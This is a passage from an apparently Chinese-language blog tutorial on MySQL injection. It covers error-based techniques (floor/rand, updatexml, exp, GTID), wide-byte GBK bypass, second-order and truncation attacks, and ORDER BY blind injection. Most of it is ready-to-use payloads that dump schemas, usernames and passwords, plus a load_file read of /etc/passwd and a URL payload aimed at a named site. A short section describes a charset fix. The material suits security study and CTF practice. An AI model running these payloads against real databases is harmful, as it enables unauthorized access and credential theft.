class="operator">*</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>) x <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> x;</span><br></pre></td></tr></table></figure></div><blockquote><p>主要利用floor(rand(0)*2)的结果规律为0 1 1 0 1 1，当数据表中最少需要三条数据才会报错</p><p>floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。</p></blockquote><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) a <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> a;</span><br><span class="line">#也可以简化成</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>));</span><br><span class="line">#关键表被过滤时</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">!</span><span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))</span><br><span class="line">#rand被过滤 适用用户变量</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(password,<span class="variable">@a</span>:<span class="operator">=</span>(<span class="variable">@a</span><span class="operator">+</span><span class="number">1</span>)<span class="operator">%</span><span class="number">2</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">爆库</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> ( <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;|&#x27;</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )a;</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.hackblog.cn<span class="operator">/</span>sql.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span></span><br><span class="line">concat(<span class="number">0x7e</span>,schema_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line">爆表</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span></span><br><span class="line">table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;|&#x27;</span>,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a;</span><br><span class="line">爆字段</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span></span><br><span class="line">table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span>‘users’ limit <span class="number">0</span>,<span class="number">1</span>),’<span class="operator">|</span>’,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> x)a;</span><br><span class="line">爆数据</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),(concat((<span class="keyword">select</span> concat(name,’<span class="operator">|</span>’,passwd,’<span class="operator">|</span>’,birth) <span class="keyword">from</span> users limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>),’<span class="operator">|</span>’,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a;</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> concat(<span class="number">0x23</span>,name,<span class="number">0x3a</span>,passwd,<span class="number">0x23</span>) <span class="keyword">FROM</span> users limit</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">3</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a</span><br></pre></td></tr></table></figure></div><p>几何函数 </p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GeometryCollection：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> GeometryCollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span><span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">polygon()：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">multipoint()：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">multilinestring()：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">linestring()：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> LINESTRING((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br><span class="line">multipolygon() ：id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</span><br></pre></td></tr></table></figure></div><p>不存在函数</p><blockquote><p>爆数据库</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032231655.jpg"                      alt="image-20220708181105742"                ><figcaption>image-20220708181105742</figcaption></figure></p></blockquote><p>name_const()</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取版本信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> name_const(version(),<span class="number">0x1</span>),name_const(version(),<span class="number">0x1</span>))a;</span><br><span class="line"># <span class="number">1060</span> <span class="operator">-</span> Duplicate <span class="keyword">column</span> name <span class="string">&#x27;8.0.27&#x27;</span></span><br></pre></td></tr></table></figure></div><p>uuid相关函数</p><p>mysql:8.0.x</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> UUID_TO_BIN((<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="number">1</span>));</span><br><span class="line"># <span class="number">1146</span> <span class="operator">-</span> <span class="keyword">Table</span> <span class="string">&#x27;test.users&#x27;</span> doesn<span class="string">&#x27;t exist</span></span><br><span class="line"><span class="string">mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</span></span><br><span class="line"><span class="string"># 1146 - Table &#x27;</span>test.users<span class="string">&#x27; doesn&#x27;</span>t exist</span><br></pre></td></tr></table></figure></div><p>exp() 适用版本 5.5.5-5.5.49</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">USER</span>())a));</span><br><span class="line"><span class="comment">--其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函 数内，得到的结果将超过mysql的double数组范围，从而报错输出。除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。</span></span><br><span class="line"><span class="comment">--double 数值类型超出范围</span></span><br><span class="line"><span class="comment">--Exp()为以e 为底的对数函数；</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span></span><br><span class="line"></span><br><span class="line">如果是在适用版本之外：虽然也会报错，但是表名不会出来</span><br><span class="line"><span class="keyword">select</span> <span class="operator">!</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)<span class="operator">-</span><span class="operator">~</span><span class="number">0</span>;</span><br></pre></td></tr></table></figure></div><blockquote><p>exp报错<a class="link"   href="https://www.cnblogs.com/lcamry/articles/5509124.html" >（转载）使用exp进行SQL报错注入 - lcamry - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></blockquote><p>pow()结合盲注</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> pow(<span class="number">1</span><span class="operator">+</span>(表达式),<span class="number">999999999999</span>)</span><br><span class="line"># 表达式可以是盲注的形式，返回<span class="number">1</span>或者<span class="number">0</span>，通过报错将字符猜出来，报错回显的表达式是返回<span class="number">1</span>的</span><br><span class="line"># 同样方式用在exp上(临界值为<span class="number">709</span>)</span><br><span class="line"><span class="built_in">exp</span>(<span class="number">709</span><span class="operator">+</span>(表达式))</span><br></pre></td></tr></table></figure></div><p>bigint 溢出文章<a class="link"   href="http://www.cnblogs.com/lcamry/articles/5509112.html" >http://www.cnblogs.com/lcamry/articles/5509112.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;?id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> (<span class="operator">!</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x) <span class="operator">-</span> <span class="operator">~</span><span class="number">0</span>),<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></div><h3 id="xpath语法错误–较常用"><a href="#xpath语法错误–较常用" class="headerlink" title="xpath语法错误–较常用"></a>xpath语法错误–较常用</h3><p>报错原因，0x7e就是~不属于xpath语法格式</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>));</span><br><span class="line"><span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="variable">@version</span>),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br><span class="line"># 适用版本: <span class="number">5.1</span><span class="number">.5</span><span class="operator">+</span></span><br></pre></td></tr></table></figure></div><blockquote><p>updatexml三个参数</p><ul><li><p>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 1</p></li><li><p>第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。</p></li><li><p>第三个参数：new_value，String 格式，替换查找到的符合条件的数据**</p></li></ul><p>注意加select防止不回显，当显示字符有限时，常用字符串截断substr配合</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> NAME_CONST(version(),<span class="number">1</span>),NAME_CONST(version(),<span class="number">1</span>))x;</span><br><span class="line"><span class="comment">--mysql 重复特性，此处重复了version，所以报错。</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="Join-using-注列名"><a href="#Join-using-注列名" class="headerlink" title="Join using()注列名"></a>Join using()注列名</h3><p>mysql8修复</p><p>报错存在重复的列名</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)b)c; # 报错信息内回显第一列名称</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)b <span class="keyword">using</span>(username))c;# 第二列</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)b <span class="keyword">using</span>(username,password))c;# 第三列</span><br></pre></td></tr></table></figure></div><h3 id="GTID相关函数"><a href="#GTID相关函数" class="headerlink" title="GTID相关函数"></a>GTID相关函数</h3><p>版本&gt;&#x3D;5.6.5</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subset(<span class="keyword">user</span>(),<span class="number">1</span>); # 报错回显用户</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subset(hex(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit</span><br><span class="line"><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>);</span><br><span class="line">mysql<span class="operator">&gt;</span><span class="keyword">select</span> gtid_subtract((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a),<span class="number">1</span>); # 报错回显用户</span><br></pre></td></tr></table></figure></div><h2 id="导入导出文件"><a href="#导入导出文件" class="headerlink" title="导入导出文件"></a>导入导出文件</h2><h3 id="查看限制"><a href="#查看限制" class="headerlink" title="查看限制"></a>查看限制</h3><p>secure_file_priv</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032232760.jpg"                      alt="image-20220708190755416"                ><figcaption>image-20220708190755416</figcaption></figure></p><h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>load_file(filename)</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032232156.jpg"                      alt="image-20220708190902690"                ><figcaption>image-20220708190902690</figcaption></figure></p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">convert</span>(load_file(&quot;/etc/passwd&quot;) <span class="keyword">using</span> utf8);</span><br></pre></td></tr></table></figure></div><p>详见<a class="link"   href="https://ccship.cn/2021/10/21/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" >SQL注入总结 – cc (ccship.cn) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="常见思路-1"><a href="#常见思路-1" class="headerlink" title="常见思路"></a>常见思路</h3><p>如果是单引号闭合</p><p>注册一个<code>admin&#39;#</code>账户，登录修改其密码，则实际改的是admin的密码</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</p><p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。PHP的编码为UTF-8 而MySql的编码设置为了SET NAMES ‘gbk’ 或是SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><ul><li><p><strong>addslashes()</strong> ：这个函数在预定义字符之前添加反斜杠 \ 。预定义字符： 单引号 ‘ 、双引号 ” 、反斜杠 \ 、NULL。但是这个函数有一个特点就是虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。</p><blockquote><p>这个函数功能与魔术引号功能完全相同，如果魔术引号打开就不要用这个函数了</p></blockquote></li><li><p>三个魔术引号功能</p><blockquote><ol><li><p>magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。 参见 get_magic_quotes_gpc()。如果 magic_quotes_gpc 关闭时返回 0，开启时返回 1。在 PHP 5.4.0 起将始终返回 0，因为这个魔术引号功能已经从 PHP 中移除了。</p></li><li><p>magic_quotes_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。 参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。</p></li><li><p>magic_quotes_sybase (魔术引号开关)如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ”。而双引号、反斜线 和 NULL 字符将不会进行转义。</p></li></ol></blockquote></li></ul><h3 id="gbk编码"><a href="#gbk编码" class="headerlink" title="gbk编码"></a>gbk编码</h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用户名输入：admin<span class="operator">%</span>df<span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string">转义后为： admin%df\&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line"><span class="keyword">SET</span> character_set_client <span class="operator">=</span><span class="string">&#x27;gbk&#x27;</span>后：admin運<span class="string">&#x27; or 1=1#</span></span><br><span class="line"><span class="string">执行语句：... where username=&#x27;</span>admin運<span class="string">&#x27; or 1=1#&#x27;</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>%df</code>吃掉<code>\</code>的原因是，<code>urlencode(\&#39;)</code>&#x3D;<code>%5c%27</code> ,添加%df后形成<code>%df%5c%27</code>,而上面提到的mysql 在GBK 编码方式的，第一位范围为0x00-0x7F时，当作一个字符。%df不在这个范围内，因此会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27(‘) 则作为一个单独的符号在外面，同时也就达到了我们的目的</p></blockquote><h3 id="utf8编码、Latin1编码"><a href="#utf8编码、Latin1编码" class="headerlink" title="utf8编码、Latin1编码"></a>utf8编码、Latin1编码</h3><p>UTF-8编码是变长编码，可能有1~4个字节表示： </p><ul><li>一字节时范围是<code>[00-7F] </code></li><li>两字节时范围是<code>[C0-DF][80-BF]</code> </li><li>三字节时范围是<code>[E0-EF][80-BF][80-BF]</code> </li><li>四字节时范围是<code>[F0-F7][80-BF][80-BF][80-BF]</code></li></ul><blockquote><p>然后根据RFC 3629规范，又有一些字节值是不允许出现在UTF-8编码中, 所以最终，UTF-8第一字节的取值范围是：00-7F、C2-F4。</p></blockquote><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：?username<span class="operator">=</span>admin<span class="operator">%</span>c2</span><br><span class="line"><span class="operator">%</span>c2是Latin1字符集不存在的字符，<span class="operator">%</span><span class="number">00</span><span class="operator">-</span><span class="operator">%</span><span class="number">7</span>F可以直接表示某个字符、<span class="operator">%</span>C2<span class="operator">-</span><span class="operator">%</span>F4不可以直接表示某个字符而只是其他长字节编码结果的首字节。对于不完整的长字节UTF<span class="number">-8</span>编码的字符，进行字符集转换时会直接忽略，所以admin<span class="operator">%</span>c2会变成admin</span><br></pre></td></tr></table></figure></div><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><ul><li><p>在调用 <strong>mysql_real_escape_string()</strong> 函数之前，先设置连接所使用的字符集为GBK ，<strong>mysql_set_charset&#x3D;(‘gbk’,$conn)</strong> 。</p></li><li><p>所以防止宽字节注入的另一个方法就是将 <strong>character_set_client</strong> 设置为binary(二进制)。需要在所有的sql语句前指定连接的形式是binary二进制：</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;SET character_set_connection=gbk, character_set_results=gbk,character_set_client=binary&quot;, $conn); </span><br></pre></td></tr></table></figure></div><blockquote><p>当我们的MySQL收到客户端的请求数据后，会认为他的编码是character_set_client所对应的编码，也就是二进制。然后再将它转换成character_set_connection所对应的编码。然后进入具体表和字段后，再转换成字段对应的编码。当查询结果产生后，会从表和字段的编码转换成character_set_results所对应的编码，返回给客户端。所以，当我们将character_set_client编码设置成了binary，就不存在宽字节注入的问题了，所有的数据都是以二进制的形式传递。</p></blockquote></li></ul><h2 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h2><p>当数据库字符串长度过短，并且后端没有对字符串进行长度限制时</p><p>select 语句对于参数后面空格的处理是删除，insert只是截取最大长度的字符串，然后插入数据库。</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users(</span><br><span class="line">username <span class="type">varchar</span>(<span class="number">25</span>),</span><br><span class="line">  password <span class="type">varchar</span>(<span class="number">25</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div><p>最大长度限制(具体看表的定义)为25 我们输入用户名为 admin[20个空格]1,密码随意。脚本查询的时候因为用了select 语句，空格被删除，剩下了admin1。</p><p>注册时：INSERT取前25位-&gt;admin[20个空格]和自己设定的密码当成了一个新用户-&gt;select查找admin，返回两条</p><blockquote><p>数据库里面的空格也在查询的时候被删除了再比较</p></blockquote><h2 id="order-by-后的注入"><a href="#order-by-后的注入" class="headerlink" title="order by 后的注入"></a>order by 后的注入</h2><h3 id="order-by参数后注入"><a href="#order-by参数后注入" class="headerlink" title="order by参数后注入"></a>order by参数后注入</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];  </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure></div><p>sort可以是sql语句，只要保证返回一行一列或者是一个数字或布尔类型也可以,一般有以下三种</p><ul><li><p>直接注入语句（要返回单行单列） ?sort&#x3D;(select ……)</p></li><li><p>利用函数rand ?sort&#x3D;rand(sql语句)</p><ul><li>利用的是rand(true)与rand(false)导致题目回显不同而构造盲注条件</li></ul><p>也可以用报错注入</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns <span class="keyword">group</span> <span class="keyword">by</span> concat(<span class="number">0x3a</span>,<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x3a</span>,<span class="number">0x3a</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>)))</span><br></pre></td></tr></table></figure></div></li><li><p>利用and ?sort&#x3D;1 and(sql语句)</p><ul><li>这里的sql语句可以用延时注入</li></ul><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> If(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span>,<span class="number">0</span>,sleep(<span 